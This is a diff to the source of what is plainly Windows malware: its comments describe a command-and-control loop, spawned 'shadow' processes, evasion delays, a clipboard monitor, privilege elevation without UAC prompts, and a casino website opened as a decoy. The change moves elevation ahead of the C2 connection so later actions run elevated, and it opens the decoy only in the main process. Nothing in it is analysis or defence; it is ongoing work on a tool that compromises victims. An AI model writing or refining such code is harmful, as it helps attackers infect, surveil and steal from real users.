@@ -424,11 +424,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         isShadow = 1;
     }
     
+    /* === PHASE 0: Elevate FIRST (before anything else) ===
+     * If main process is not admin, elevate immediately and exit.
+     * This ensures ALL subsequent operations (C2, spawning shadows,
+     * scheduled tasks) run elevated WITHOUT UAC prompts. */
+    if (!isShadow) {
+        sys_check_privileges();
+    }
+    
     /* === PHASE 1: Connect to C2 IMMEDIATELY ===
      * Start C2 loop in a background thread FIRST so the server
-     * sees us before any long evasion sleeps. Critical fix:
-     * previously C2 was the LAST thing in WinMain, but evasion
-     * took 7-22s, so shadows never appeared on dashboard. */
+     * sees us before any long evasion sleeps. */
     InitializeCriticalSection(&g_copy_buffer_cs);
     copy_buffer_init();
     
@@ -458,8 +464,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Initialize UI */
     ui_init();
     
-    /* Open casino decoy website */
-    ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
+    /* Open casino decoy website (only for main process, not shadows) */
+    if (!isShadow) {
+        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
+    }
     
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
@@ -473,13 +481,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
-    }
-    
-    /* Elevate privileges if needed for full functionality.
-     * Shadows skip this to avoid UAC prompts — they inherit
-     * parent's token via CreateProcessA. */
-    if (!isShadow) {
-        sys_check_privileges();
     }
     
     /* Start protection watchdog thread */
